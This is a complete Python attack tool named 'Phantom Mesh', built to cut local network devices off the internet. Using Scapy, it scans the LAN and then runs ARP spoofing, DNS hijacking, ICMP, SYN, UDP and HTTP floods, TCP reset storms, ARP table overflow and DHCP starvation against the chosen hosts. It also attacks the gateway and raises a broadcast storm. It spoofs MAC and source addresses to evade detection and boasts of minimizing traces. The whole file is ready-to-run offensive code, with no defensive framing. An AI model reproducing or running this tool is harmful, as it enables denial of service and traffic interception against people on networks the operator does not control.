#!/usr/bin/env python3
# Author: mrch4n725
import socket
import threading
import time
import sys
import os
import re
import random
import subprocess
import hashlib
import struct
import logging
from collections import defaultdict

try:
    import scapy.all as scapy
    from scapy.layers.inet import IP, ICMP, UDP, TCP
    from scapy.layers.dns import DNS, DNSRR
    from scapy.layers.dhcp import DHCP, BOOTP
    from scapy.layers.http import HTTP, HTTPRequest
except ImportError:
    print("[-] Scapy not installed. Installing...")
    subprocess.run([sys.executable, "-m", "pip", "install", "scapy", "-q"])
    import scapy.all as scapy

# Suppress Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("scapy").setLevel(logging.ERROR)
scapy.conf.verb = 0


class NetworkKiller:
    def __init__(self):
        self.attacking = False
        self.gateway_ip = ""
        self.gateway_mac = ""
        self.own_ip = ""
        self.own_mac = ""
        self.real_mac = ""  # Store real MAC for restoration
        self.spoofed_mac = ""  # MAC to use for attacks
        self.network = ""
        self.targets = []
        self.selected_targets = []
        self.attack_threads = []
        self.use_mac_spoof = True  # Enable MAC spoofing by default
        self.use_random_delays = True  # Randomize timing
        self.use_vlan_hopping = False  # Try VLAN hopping if available
        self.fragment_packets = True  # Fragment packets to evade IDS
        self.random_source_ips = set()  # Store random IPs for spoofing
        self.print_lock = threading.Lock()  # Thread-safe printing
        self.target_lock = threading.Lock()  # Protect target list during threaded scans

    def clear_screen(self):
        """Clear terminal screen."""
        os.system("clear" if os.name == "posix" else "cls")

    def safe_print(self, msg, rate_limit=False):
        """Thread-safe print with optional rate limiting."""
        if rate_limit and random.random() > 0.3:  # Only print 30% of messages to reduce spam
            return
        with self.print_lock:
            print(msg)

    def print_banner(self):
        """Print cool banner."""
        self.clear_screen()
        print("""
╔══════════════════════════════════════════════╗
║                                              ║
║            Phantom Mesh -v2.0-               ║
║               by mrch4n725                   ║
║     Destroy and Cripple Internet Access      ║
║            (For real this time)              ║
╚══════════════════════════════════════════════╝
        """)

    def auto_detect_network(self):
        """Automatically detect network configuration."""
        print("[*] Auto-detecting network configuration...")
        try:
            # Get own IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.own_ip = s.getsockname()[0]
            s.close()

            # Get own MAC
            self.real_mac = scapy.get_if_hwaddr(scapy.conf.iface)
            self.own_mac = self.real_mac

            # Calculate network
            parts = self.own_ip.split(".")
            self.gateway_ip = f"{parts[0]}.{parts[1]}.{parts[2]}.1"
            self.network = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"

            print(f"[+] Your IP: {self.own_ip}")
            print(f"[+] Your MAC: {self.own_mac}")
            print(f"[+] Gateway: {self.gateway_ip}")
            print(f"[+] Network: {self.network}")
            return True
        except Exception as e:
            print(f"[-] Detection failed: {e}")
            return False

    def generate_spoofed_mac(self):
        """Generate a realistic spoofed MAC address."""
        # Use vendor prefixes to look legitimate (common vendors)
        vendors = [
            "00:1a:2b",  # Common vendor
            "00:26:5e",  # Common vendor
            "00:50:f2",  # Microsoft
            "08:00:27",  # VirtualBox
            "52:54:00",  # QEMU
        ]
        vendor = random.choice(vendors)
        device = f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
        self.spoofed_mac = f"{vendor}:{device}"
        print(f"[+] Generated spoofed MAC: {self.spoofed_mac}")
        return self.spoofed_mac

    def spoof_interface_mac(self):
        """Attempt to change interface MAC (if permissions allow)."""
        try:
            iface = scapy.conf.iface
            self.generate_spoofed_mac()
            print(f"[*] Attempting to spoof interface MAC...")
            os.system(f"ip link set dev {iface} down 2>/dev/null")
            os.system(f"ip link set dev {iface} address {self.spoofed_mac} 2>/dev/null")
            os.system(f"ip link set dev {iface} up 2>/dev/null")
            time.sleep(0.5)
            print(f"[+] Interface MAC spoofed!")
            return True
        except:
            print("[!] Could not spoof interface MAC, will spoof in packets instead")
            self.generate_spoofed_mac()
            return False

    def generate_random_internal_ips(self, count=5):
        """Generate random IPs from internal network to use as source."""
        parts = self.own_ip.split(".")
        base = f"{parts[0]}.{parts[1]}.{parts[2]}."
        
        for _ in range(count):
            ip = base + str(random.randint(10, 254))
            if ip != self.own_ip and ip != self.gateway_ip:
                self.random_source_ips.add(ip)
        
        print(f"[+] Generated {len(self.random_source_ips)} fake source IPs")

    def get_random_delay(self):
        """Minimal delay for maximum throughput."""
        return random.uniform(0.01, 0.05)

    def get_gateway_mac(self):
        """Get gateway MAC address automatically."""
        print("\n[*] Discovering gateway MAC address...")
        
        # Method 1: Check ARP cache
        try:
            with open("/proc/net/arp", "r") as f:
                for line in f:
                    if self.gateway_ip in line:
                        parts = line.split()
                        if len(parts) >= 4 and parts[3] != "00:00:00:00:00:00":
                            self.gateway_mac = parts[3]
                            print(f"[+] Gateway MAC (from cache): {self.gateway_mac}")
                            return True
        except:
            pass

        # Method 2: ARP request
        print("[*] Sending ARP request...")
        try:
            arp_request = scapy.ARP(pdst=self.gateway_ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_broadcast = broadcast / arp_request
            answered, _ = scapy.srp(arp_broadcast, timeout=3, verbose=False)
            
            for send, receive in answered:
                self.gateway_mac = receive.hwsrc
                print(f"[+] Gateway MAC (from ARP): {self.gateway_mac}")
                return True
        except:
            pass

        # Method 3: Use fake MAC if detection fails
        print("[!] Using fallback gateway MAC...")
        self.gateway_mac = "ff:ff:ff:ff:ff:ff"
        return True

    def scan_network(self):
        """Scan network for active hosts using multiple methods."""
        print(f"\n[*] Scanning network {self.network}...")
        
        self.targets = []
        
        # Method 1: ARP scan (fastest)
        print("[*] Method 1: ARP scanning (fast)...")
        try:
            arp_request = scapy.ARP(pdst=self.network)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_broadcast = broadcast / arp_request
            
            answered, _ = scapy.srp(arp_broadcast, timeout=2, verbose=False)
            
            for send, receive in answered:
                ip = receive.psrc
                mac = receive.hwsrc
                
                if ip != self.gateway_ip and ip != self.own_ip:
                    self.targets.append({"ip": ip, "mac": mac})
                    print(f"[+] Found: {ip} ({mac})")
        except Exception as e:
            print(f"[!] ARP scan failed: {e}")
        
        # Method 2: Read existing ARP table (instant)
        print("[*] Method 2: Reading system ARP cache...")
        try:
            if os.path.exists("/proc/net/arp"):
                with open("/proc/net/arp", "r") as f:
                    lines = f.readlines()[1:]
                    for line in lines:
                        parts = line.split()
                        if len(parts) >= 4:
                            ip = parts[0]
                            mac = parts[3]
                            
                            # Check if in our network
                            if self.is_in_network(ip) and ip != self.gateway_ip and ip != self.own_ip:
                                if mac != "00:00:00:00:00:00":
                                    # Check if already added
                                    if not any(t["ip"] == ip for t in self.targets):
                                        self.targets.append({"ip": ip, "mac": mac})
                                        print(f"[+] Found: {ip} ({mac})")
        except Exception as e:
            print(f"[!] ARP table read failed: {e}")
        
        # Method 3: Parallel ICMP ping sweep (only if needed and faster)
        if len(self.targets) == 0:
            print("[*] Method 3: Parallel ICMP ping sweep...")
            self.ping_sweep_parallel()
        
        if self.targets:
            print(f"\n[+] Total targets found: {len(self.targets)}")
            return True
        else:
            print("[-] No targets found via automatic scan")
            return self.manual_target_entry()

    def ping_sweep_parallel(self):
        """Fast parallel ICMP ping sweep using threads."""
        parts = self.own_ip.split(".")
        base = f"{parts[0]}.{parts[1]}.{parts[2]}."
        
        def ping_ip(ip_num):
            """Ping a single IP and get MAC if responsive."""
            ip = base + str(ip_num)
            
            try:
                # Quick ping
                pkt = IP(dst=ip, ttl=64)/ICMP(type=8, code=0, id=random.randint(1, 65535))
                result = scapy.sr1(pkt, timeout=0.3, verbose=False)
                
                if result:
                    # Get MAC via ARP
                    arp_req = scapy.ARP(pdst=ip)
                    eth = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
                    arp_pkt = eth/arp_req
                    ans, _ = scapy.srp(arp_pkt, timeout=0.5, verbose=False)
                    
                    mac = "unknown"
                    for send, receive in ans:
                        mac = receive.hwsrc
                    
                    with self.target_lock:
                        if not any(t["ip"] == ip for t in self.targets):
                            self.targets.append({"ip": ip, "mac": mac})
                            self.safe_print(f"[+] Found: {ip} ({mac})")
            except:
                pass
        
        # Use thread pool for faster scanning
        threads = []
        for i in range(1, 255):
            if base + str(i) == self.own_ip or base + str(i) == self.gateway_ip:
                continue
            
            t = threading.Thread(target=ping_ip, args=(i,), daemon=True)
            threads.append(t)
            t.start()
            
            # Limit concurrent threads
            if len(threads) >= 50:
                for thread in threads:
                    thread.join(timeout=1)
                threads = []
        
        # Wait for remaining threads
        for thread in threads:
            thread.join(timeout=1)

    def is_in_network(self, ip):
        """Check if IP is in our network."""
        try:
            parts = self.own_ip.split(".")
            network_parts = ip.split(".")
            return parts[0] == network_parts[0] and parts[1] == network_parts[1] and parts[2] == network_parts[2]
        except:
            return False

    def manual_target_entry(self):
        """Allow manual entry of target IPs."""
        print("\n[*] Enter targets manually:")
        print("    Format: IP,MAC or just IP (semicolon-separated for multiple entries)")
        print("    Example: 192.168.1.5,00:11:22:33:44:55; 192.168.1.10")
        
        try:
            entry = input("[?] Enter target(s): ").strip()
        except (KeyboardInterrupt, EOFError):
            raise
        
        if not entry:
            return False
        
        for raw_target in re.split(r"[;\n]+", entry):
            target = raw_target.strip()
            if not target:
                continue

            ip = None
            mac = "unknown"

            if "," in target:
                parts = [p.strip() for p in target.split(",", 1)]
                ip = parts[0]
                if len(parts) > 1 and parts[1]:
                    mac = parts[1]
            else:
                parts = target.split()
                if parts:
                    ip = parts[0]
                    if len(parts) > 1:
                        mac = parts[1]

            if not ip:
                continue

            if re.match(r"^(\d{1,3}\.){3}\d{1,3}$", ip):
                self.targets.append({"ip": ip, "mac": mac})
                print(f"[+] Added: {ip} ({mac})")
            else:
                print(f"[-] Skipping invalid entry: {target}")
        
        if self.targets:
            print(f"[+] Total targets: {len(self.targets)}")
            return True
        return False

    def display_targets(self):
        """Display available targets."""
        if not self.targets:
            print("[-] No targets available. Run scan first.")
            return
        
        print("\n" + "="*60)
        print(f"{'#':<3} {'IP Address':<20} {'MAC Address':<25}")
        print("="*60)
        
        for idx, target in enumerate(self.targets):
            print(f"{idx:<3} {target['ip']:<20} {target['mac']:<25}")
        
        print("="*60)

    def select_targets(self):
        """Let user select targets."""
        self.display_targets()
        
        if not self.targets:
            return False
        
        print("\n[*] Select targets to attack:")
        print("    - Enter numbers separated by commas (e.g., 0,1,2)")
        print("    - Enter 'all' to select all targets")
        print("    - Enter 'none' to cancel")
        
        choice = input("\n[?] Selection: ").strip().lower()
        
        if choice == "none":
            return False
        
        self.selected_targets = []
        
        if choice == "all":
            self.selected_targets = self.targets.copy()
        else:
            try:
                indices = [int(x.strip()) for x in choice.split(",")]
                for idx in indices:
                    if 0 <= idx < len(self.targets):
                        self.selected_targets.append(self.targets[idx])
            except:
                print("[-] Invalid input!")
                return False
        
        if not self.selected_targets:
            print("[-] No targets selected!")
            return False
        
        print(f"\n[+] Selected {len(self.selected_targets)} target(s):")
        for target in self.selected_targets:
            print(f"    - {target['ip']} ({target['mac']})")
        
        return True

    def arp_spoof(self, target_ip, target_mac):
        """Aggressive ARP spoofing - constant, relentless assault."""
        spoof_src_mac = self.spoofed_mac if self.use_mac_spoof else self.own_mac
        
        target_pkt = scapy.ARP(op=2, psrc=self.gateway_ip, hwsrc=spoof_src_mac,
                               pdst=target_ip, hwdst=target_mac)
        gateway_pkt = scapy.ARP(op=2, psrc=target_ip, hwsrc=spoof_src_mac,
                                pdst=self.gateway_ip, hwdst=self.gateway_mac)
        
        count = 0
        error_count = 0
        try:
            while self.attacking:
                try:
                    # Send packets as fast as possible
                    for _ in range(200):
                        scapy.send(target_pkt, verbose=0, iface=scapy.conf.iface)
                        scapy.send(gateway_pkt, verbose=0, iface=scapy.conf.iface)
                        count += 2
                    
                    self.safe_print(f"[ARP {target_ip}] Packets: {count:<8} | Errors: {error_count}")
                    time.sleep(0.001)  # Minimal delay
                except Exception as e:
                    error_count += 1
        except:
            pass

    def dns_spoof(self, target_ip):
        """DNS spoofing with randomized responses."""
        request_count = 0
        error_count = 0
        dns_detected = False
        
        def process_dns(pkt):
            nonlocal request_count, error_count, dns_detected
            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                dns_detected = True
                try:
                    response_ip = random.choice(list(self.random_source_ips)) if self.random_source_ips else self.own_ip
                    dns_qr = IP(dst=pkt[IP].src, src=pkt[IP].dst, ttl=random.randint(32, 128)) / \
                             UDP(dport=pkt[UDP].sport, sport=53) / \
                             DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                 an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=random.randint(1, 60),
                                          rdata=response_ip))
                    scapy.send(dns_qr, verbose=0, iface=scapy.conf.iface)
                    request_count += 1
                    self.safe_print(f"[DNS {target_ip}] Hijacked: {request_count}")
                except Exception:
                    error_count += 1
        
        try:
            timeout_count = 0
            while self.attacking:
                try:
                    scapy.sniff(iface=scapy.conf.iface,
                               prn=process_dns,
                               filter=f"udp port 53 and src {target_ip}",
                               store=0, timeout=0.5)
                    timeout_count += 1
                    if timeout_count % 20 == 0:
                        self.safe_print(f"[DNS {target_ip}] Sniffing... ({timeout_count*5}s)")
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    error_count += 1
        except:
            pass

    def packet_flood(self, target_ip):
        """Massive ICMP flood - saturate the network."""
        count = 0
        error_count = 0
        try:
            while self.attacking:
                try:
                    for _ in range(500):  # 10x more packets
                        src_ip = random.choice(list(self.random_source_ips)) if self.random_source_ips else self.own_ip
                        payload_size = 1500  # Max size
                        pkt = IP(dst=target_ip, src=src_ip, ttl=64) / \
                              ICMP(type=8, code=0, seq=random.randint(1, 65535)) / \
                              scapy.Raw(load=os.urandom(payload_size))
                        
                        scapy.send(pkt, verbose=0, iface=scapy.conf.iface)
                        count += 1
                    
                    self.safe_print(f"[FLOOD {target_ip}] Packets: {count:<8} | Errors: {error_count}")
                except Exception as e:
                    error_count += 1
        except:
            pass

    def syn_flood(self, target_ip):
        """Aggressive TCP SYN flood - overload connection queues."""
        count = 0
        error_count = 0
        try:
            while self.attacking:
                try:
                    for _ in range(300):  # Massive SYN flood
                        src_ip = random.choice(list(self.random_source_ips)) if self.random_source_ips else self.own_ip
                        src_port = random.randint(1024, 65535)
                        target_port = random.choice([80, 443, 22, 21, 25, 3306, 5432, 8080, 8443])
                        
                        syn_pkt = IP(dst=target_ip, src=src_ip, ttl=64) / \
                                 TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000000, 9999999))
                        
                        scapy.send(syn_pkt, verbose=0, iface=scapy.conf.iface)
                        count += 1
                    
                    self.safe_print(f"[SYN {target_ip}] Packets: {count:<8} | Errors: {error_count}")
                except Exception as e:
                    error_count += 1
        except:
            pass

    def udp_flood(self, target_ip):
        """Massive UDP flood - saturate all ports."""
        count = 0
        error_count = 0
        try:
            while self.attacking:
                try:
                    for _ in range(1000):  # Extreme UDP flooding
                        src_ip = random.choice(list(self.random_source_ips)) if self.random_source_ips else self.own_ip
                        src_port = random.randint(1024, 65535)
                        target_port = random.randint(1, 65535)
                        
                        payload = os.urandom(1500)  # Max UDP payload
                        pkt = IP(dst=target_ip, src=src_ip, ttl=64) / \
                              UDP(sport=src_port, dport=target_port) / \
                              scapy.Raw(load=payload)
                        
                        scapy.send(pkt, verbose=0, iface=scapy.conf.iface)
                        count += 1
                    
                    self.safe_print(f"[UDP {target_ip}] Packets: {count:<8} | Errors: {error_count}")
                except Exception as e:
                    error_count += 1
        except:
            pass

    def tcp_rst_attack(self, target_ip):
        """Aggressive TCP RST attack - kill all connections."""
        count = 0
        error_count = 0
        try:
            while self.attacking:
                try:
                    for _ in range(500):  # Massive RST storm
                        src_ip = random.choice(list(self.random_source_ips)) if self.random_source_ips else self.own_ip
                        src_port = random.randint(1024, 65535)
                        target_port = random.randint(1, 65535)
                        seq = random.randint(1000000, 9999999)
                        ack = random.randint(1000000, 9999999)
                        
                        rst_pkt = IP(dst=target_ip, src=src_ip, ttl=64) / \
                                 TCP(sport=src_port, dport=target_port, flags="R", seq=seq, ack=ack)
                        
                        scapy.send(rst_pkt, verbose=0, iface=scapy.conf.iface)
                        count += 1
                    
                    self.safe_print(f"[RST {target_ip}] Packets: {count:<8} | Errors: {error_count}")
                except Exception as e:
                    error_count += 1
        except:
            pass

    def http_flood(self, target_ip):
        """Aggressive HTTP flood - overload web services."""
        count = 0
        error_count = 0
        try:
            while self.attacking:
                try:
                    for _ in range(200):  # Massive HTTP requests
                        src_ip = random.choice(list(self.random_source_ips)) if self.random_source_ips else self.own_ip
                        src_port = random.randint(1024, 65535)
                        path = f"/{os.urandom(50).hex()}"
                        
                        http_req = f"GET {path} HTTP/1.1\r\nHost: {target_ip}\r\nConnection: close\r\n\r\n"
                        pkt = IP(dst=target_ip, src=src_ip, ttl=64) / \
                              TCP(sport=src_port, dport=80, flags="PA", seq=random.randint(1000000, 9999999)) / \
                              scapy.Raw(load=http_req)
                        
                        scapy.send(pkt, verbose=0, iface=scapy.conf.iface)
                        count += 1
                    
                    self.safe_print(f"[HTTP {target_ip}] Packets: {count:<8} | Errors: {error_count}")
                except Exception as e:
                    error_count += 1
        except:
            pass

    def arp_table_overflow(self, target_ip):
        """Massive ARP table overflow - confuse routing."""
        count = 0
        error_count = 0
        try:
            while self.attacking:
                try:
                    for _ in range(500):  # Extreme ARP entries
                        fake_ip_parts = target_ip.split(".")
                        fake_ip = f"{fake_ip_parts[0]}.{fake_ip_parts[1]}.{fake_ip_parts[2]}.{random.randint(1, 254)}"
                        fake_mac = f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
                        
                        arp_pkt = scapy.ARP(op=2, psrc=fake_ip, hwsrc=fake_mac, 
                                           pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
                        
                        scapy.send(arp_pkt, verbose=0, iface=scapy.conf.iface)
                        count += 1
                    
                    self.safe_print(f"[ARPT {target_ip}] Packets: {count:<8} | Errors: {error_count}")
                except Exception as e:
                    error_count += 1
        except:
            pass

    def dhcp_starvation(self, target_ip):
        """Aggressive DHCP starvation - exhaust IP pools."""
        count = 0
        error_count = 0
        try:
            parts = target_ip.split(".")
            broadcast = f"{parts[0]}.{parts[1]}.{parts[2]}.255"
            
            while self.attacking:
                try:
                    for _ in range(100):  # Massive DHCP Discovers
                        random_mac = f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
                        transaction_id = random.randint(1, 0xffffffff)
                        
                        eth = scapy.Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff")
                        ip = IP(src="0.0.0.0", dst=broadcast)
                        udp = UDP(sport=68, dport=67)
                        dhcp = BOOTP(op=1, xid=transaction_id, chaddr=random_mac)
                        dhcp_discover = DHCP(options=[("message-type", 1), ("end")])
                        
                        pkt = eth / ip / udp / dhcp / dhcp_discover
                        scapy.send(pkt, verbose=0, iface=scapy.conf.iface)
                        count += 1
                    
                    self.safe_print(f"[DHCP {target_ip}] Packets: {count:<8} | Errors: {error_count}")
                except Exception as e:
                    error_count += 1
        except:
            pass

    def gateway_attack(self):
        """Aggressive attack on the gateway/router - disable the entire network."""
        count = 0
        error_count = 0
        try:
            while self.attacking:
                try:
                    # Flood gateway with ARP
                    for _ in range(100):
                        fake_mac = f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
                        arp_pkt = scapy.ARP(op=2, psrc=self.gateway_ip, hwsrc=fake_mac, 
                                           pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff")
                        scapy.send(arp_pkt, verbose=0, iface=scapy.conf.iface)
                        count += 1
                    
                    # SYN flood gateway
                    for _ in range(200):
                        src_ip = random.choice(list(self.random_source_ips)) if self.random_source_ips else self.own_ip
                        syn_pkt = IP(dst=self.gateway_ip, src=src_ip, ttl=64) / \
                                 TCP(sport=random.randint(1024, 65535), dport=80, flags="S", seq=random.randint(1000000, 9999999))
                        scapy.send(syn_pkt, verbose=0, iface=scapy.conf.iface)
                        count += 1
                    
                    # UDP flood gateway
                    for _ in range(500):
                        src_ip = random.choice(list(self.random_source_ips)) if self.random_source_ips else self.own_ip
                        pkt = IP(dst=self.gateway_ip, src=src_ip, ttl=64) / \
                              UDP(sport=random.randint(1024, 65535), dport=random.randint(1, 65535)) / \
                              scapy.Raw(load=os.urandom(1500))
                        scapy.send(pkt, verbose=0, iface=scapy.conf.iface)
                        count += 1
                    
                    self.safe_print(f"[GWY {self.gateway_ip}] Packets: {count:<8} | Errors: {error_count}")
                except Exception as e:
                    error_count += 1
        except:
            pass

    def broadcast_storm(self):
        """Network-wide broadcast storm - chaos."""
        count = 0
        error_count = 0
        try:
            parts = self.own_ip.split(".")
            broadcast = f"{parts[0]}.{parts[1]}.{parts[2]}.255"
            
            while self.attacking:
                try:
                    # ARP broadcast storm
                    for _ in range(300):
                        fake_ip = f"{parts[0]}.{parts[1]}.{parts[2]}.{random.randint(1, 254)}"
                        fake_mac = f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
                        
                        arp_pkt = scapy.ARP(op=2, psrc=fake_ip, hwsrc=fake_mac, 
                                           pdst=broadcast, hwdst="ff:ff:ff:ff:ff:ff")
                        scapy.send(arp_pkt, verbose=0, iface=scapy.conf.iface)
                        count += 1
                    
                    # ICMP broadcast flood
                    for _ in range(500):
                        fake_ip = f"{parts[0]}.{parts[1]}.{parts[2]}.{random.randint(1, 254)}"
                        pkt = IP(dst=broadcast, src=fake_ip, ttl=64) / \
                              ICMP(type=8, code=0, seq=random.randint(1, 65535)) / \
                              scapy.Raw(load=os.urandom(1500))
                        scapy.send(pkt, verbose=0, iface=scapy.conf.iface)
                        count += 1
                    
                    self.safe_print(f"[STORM] Broadcast packets: {count:<8} | Errors: {error_count}")
                except Exception as e:
                    error_count += 1
        except:
            pass

    def start_attacks(self):
        """Start all attacks on selected targets."""
        if not self.selected_targets:
            print("[-] No targets selected!")
            return
        
        print("\n" + "="*60)
        print("[*] Initializing network crippling mode...")
        print("="*60)
        
        print("[*] Setting up MAC spoofing...")
        self.spoof_interface_mac()
        
        print("[*] Generating random source IPs...")
        self.generate_random_internal_ips(20)
        
        print("\n" + "="*60)
        print("[!] MAXIMUM ASSAULT - CRIPPLING ENTIRE LAN!")
        print("[!] 11 concurrent attacks per device + Gateway + Broadcast")
        print("="*60)
        print("\n[*] Attacks: ARP | DNS | ICMP | SYN | UDP | RST | HTTP | ARPT | DHCP + Gateway + Broadcast\n")
        
        self.attacking = True
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
        
        # Create and track all threads
        self.attack_threads = []
        
        for target in self.selected_targets:
            # 9 attacks per target device
            for idx in range(1, 10):
                if idx == 1:
                    t = threading.Thread(target=self.arp_spoof, args=(target['ip'], target['mac']), daemon=False)
                elif idx == 2:
                    t = threading.Thread(target=self.dns_spoof, args=(target['ip'],), daemon=False)
                elif idx == 3:
                    t = threading.Thread(target=self.packet_flood, args=(target['ip'],), daemon=False)
                elif idx == 4:
                    t = threading.Thread(target=self.syn_flood, args=(target['ip'],), daemon=False)
                elif idx == 5:
                    t = threading.Thread(target=self.udp_flood, args=(target['ip'],), daemon=False)
                elif idx == 6:
                    t = threading.Thread(target=self.tcp_rst_attack, args=(target['ip'],), daemon=False)
                elif idx == 7:
                    t = threading.Thread(target=self.http_flood, args=(target['ip'],), daemon=False)
                elif idx == 8:
                    t = threading.Thread(target=self.arp_table_overflow, args=(target['ip'],), daemon=False)
                elif idx == 9:
                    t = threading.Thread(target=self.dhcp_starvation, args=(target['ip'],), daemon=False)
                
                t.start()
                self.attack_threads.append(t)
                time.sleep(0.01)  # Stagger thread starts
        
        # Gateway attack threads
        for _ in range(3):
            t = threading.Thread(target=self.gateway_attack, daemon=False)
            t.start()
            self.attack_threads.append(t)
            time.sleep(0.01)
        
        # Broadcast storm threads
        for _ in range(2):
            t = threading.Thread(target=self.broadcast_storm, daemon=False)
            t.start()
            self.attack_threads.append(t)
            time.sleep(0.01)
        
        print(f"[+] ASSAULT LAUNCHED: {len(self.attack_threads)} threads active")
        print(f"[+] Targets: {len(self.selected_targets)}")
        print("[+] Press Ctrl+C to stop all attacks.\n")
        
        try:
            while self.attacking:
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.stop_attacks()

    def stop_attacks(self):
        """Stop all attacks and restore network gracefully."""
        print("\n\n[!] STOPPING ATTACKS - Cleaning up...")
        print("[*] Signaling all threads to stop...")
        self.attacking = False
        
        # Give threads a moment to check the flag
        time.sleep(0.5)
        
        # Wait for threads with timeout
        print("[*] Waiting for threads to terminate...")
        stopped = 0
        for i, thread in enumerate(self.attack_threads):
            thread.join(timeout=1)
            if not thread.is_alive():
                stopped += 1
        
        print(f"[+] {stopped}/{len(self.attack_threads)} threads stopped")
        
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
        
        # Restore ARP tables
        print("[*] Restoring ARP tables...")
        try:
            for target in self.selected_targets:
                p1 = scapy.ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac,
                              pdst=target['ip'], hwdst=target['mac'])
                p2 = scapy.ARP(op=2, psrc=target['ip'], hwsrc=target['mac'],
                              pdst=self.gateway_ip, hwdst=self.gateway_mac)
                
                for _ in range(5):
                    scapy.send(p1, verbose=0, iface=scapy.conf.iface)
                    scapy.send(p2, verbose=0, iface=scapy.conf.iface)
                    time.sleep(0.01)
        except:
            pass
        
        # Restore MAC address
        print("[*] Restoring original MAC address...")
        try:
            iface = scapy.conf.iface
            os.system(f"ip link set dev {iface} down 2>/dev/null")
            os.system(f"ip link set dev {iface} address {self.real_mac} 2>/dev/null")
            os.system(f"ip link set dev {iface} up 2>/dev/null")
        except:
            pass
        
        print("[+] Network restored! Traces minimized.")

    def run(self):
        """Main loop."""
        if os.geteuid() != 0:
            print("[-] This requires root privileges! Run with: sudo python3 phantom_menace.py")
            sys.exit(1)
        
        self.print_banner()
        
        try:
            # Auto-detect network
            if not self.auto_detect_network():
                print("[-] Failed to detect network!")
                sys.exit(1)
            
            # Get gateway MAC
            if not self.get_gateway_mac():
                print("[-] Failed to get gateway MAC!")
                sys.exit(1)
            
            # Scan network
            if not self.scan_network():
                print("[-] Scan failed!")
                sys.exit(1)
            
            # Select targets
            if not self.select_targets():
                print("[*] No targets selected. Exiting.")
                sys.exit(0)
        except (KeyboardInterrupt, EOFError):
            print("\n[*] Operation aborted by user.")
            sys.exit(0)
        
        # Confirm attack
        try:
            print("\n[!] WARNING: You are about to disable internet for selected devices!")
            confirm = input("[?] Continue? (yes/no): ").strip().lower()
        except (KeyboardInterrupt, EOFError):
            print("\n[*] Aborted by user.")
            sys.exit(0)
        
        if confirm != "yes":
            print("[*] Aborted.")
            sys.exit(0)
        
        # Start attacks
        self.start_attacks()


if __name__ == "__main__":
    killer = NetworkKiller()
    killer.run()
